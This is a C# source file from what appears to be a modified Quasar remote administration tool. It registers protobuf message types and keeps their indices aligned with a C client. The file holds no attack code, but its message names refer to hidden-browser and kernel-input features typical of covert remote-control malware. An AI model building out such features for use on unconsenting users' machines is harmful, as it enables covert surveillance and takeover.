using ProtoBuf.Meta;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Quasar.Common.Messages
{
    public static class TypeRegistry
    {
        /// <summary>
        /// The internal index of the message type.
        /// </summary>
        private static int _typeIndex;

        /// <summary>
        /// Adds a Type to the serializer so a message can be properly serialized.
        /// </summary>
        /// <param name="parent">The parent type, i.e.: IMessage</param>
        /// <param name="type">Type to be added</param>
        public static void AddTypeToSerializer(Type parent, Type type)
        {
            if (type == null || parent == null)
                throw new ArgumentNullException();

            bool isAlreadyAdded = RuntimeTypeModel.Default[parent].GetSubtypes().Any(subType => subType.DerivedType.Type == type);

            if (!isAlreadyAdded)
                RuntimeTypeModel.Default[parent].AddSubType(++_typeIndex, type);
        }

        /// <summary>
        /// Adds Types to the serializer.
        /// </summary>
        /// <param name="parent">The parent type, i.e.: IMessage</param>
        /// <param name="types">Types to add.</param>
        public static void AddTypesToSerializer(Type parent, params Type[] types)
        {
            foreach (Type type in types)
                AddTypeToSerializer(parent, type);
        }

        /// <summary>
        /// Adds a type with an explicit subtype number. Use for extension messages (e.g. C client protocol) to avoid shifting existing indices.
        /// </summary>
        public static void AddTypeWithExplicitSubtype(Type parent, Type type, int fieldNumber)
        {
            if (type == null || parent == null)
                throw new ArgumentNullException();
            if (RuntimeTypeModel.Default[parent].GetSubtypes().Any(st => st.DerivedType.Type == type))
                return;
            RuntimeTypeModel.Default[parent].AddSubType(fieldNumber, type);
        }

        private static readonly HashSet<Type> ExcludedFromBatch = new HashSet<Type>
        {
            typeof(DoInitKernelInput),
            typeof(KernelInputInitResponse),
            typeof(DoStartHiddenBrowser),
            typeof(GetHiddenBrowser),
            typeof(GetHiddenBrowserResponse),
            typeof(DoStopHiddenBrowser),
            typeof(DoCloseHiddenBrowser),
            typeof(CloseHiddenBrowserResult)
        };

        /// <summary>
        /// Returns all concrete IMessage types in a deterministic order (by FullName)
        /// so that subtype indices are stable and match the C client's protocol table.
        /// Excluded types (e.g. DoInitKernelInput, KernelInputInitResponse) must be added with AddTypeWithExplicitSubtype.
        /// </summary>
        public static IEnumerable<Type> GetPacketTypes(Type type)
        {
            return AppDomain.CurrentDomain.GetAssemblies()
                .SelectMany(s => s.GetTypes())
                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface && !p.IsAbstract && !ExcludedFromBatch.Contains(p))
                .OrderBy(p => p.FullName, StringComparer.Ordinal);
        }

        /// <summary>
        /// Returns the 1-based subtype index for the given concrete IMessage type, or 0 if not found.
        /// Used to manually write the IMessage wire prefix (0x08 + varint) so the C client receives the correct format.
        /// </summary>
        public static int GetSubtypeIndex(Type concreteType)
        {
            if (concreteType == null || !typeof(IMessage).IsAssignableFrom(concreteType)) return 0;
            var subtypes = RuntimeTypeModel.Default[typeof(IMessage)].GetSubtypes();
            foreach (var st in subtypes)
            {
                if (st.DerivedType.Type == concreteType)
                    return st.FieldNumber;
            }
            return 0;
        }
    }
}
